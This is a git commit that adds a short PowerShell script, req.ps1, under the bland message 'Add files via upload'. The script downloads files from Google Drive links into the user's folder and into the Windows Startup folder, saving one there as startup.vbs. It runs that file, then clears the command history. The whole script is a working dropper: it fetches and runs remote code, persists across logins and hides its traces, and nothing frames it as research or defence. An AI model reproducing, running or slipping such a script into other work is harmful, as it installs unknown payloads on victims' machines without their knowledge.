8d2611a0dd23444d2fa6297f3eca9cb79957522e
Lport-star <lport1080@gmail.com>
2024-11-10 18:50:10 -0800

    Add files via upload

---
+++ req.ps1
@@ -0,0 +1,8 @@
+cd C:\Users\$Env:UserName
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1XPfldT3Wo41jCj1_1QEQNtbaO3ygvOA8" -outfile "win64.bat"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1_BBPU4fExOENxeXL_5z9n1POLGG2yLY7" -outfile "user.ps1"
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1XPfldT3Wo41jCj1_1QEQNtbaO3ygvOA8" -outfile "startup.vbs"
+start startup.vbs
+Clear-History
+exit
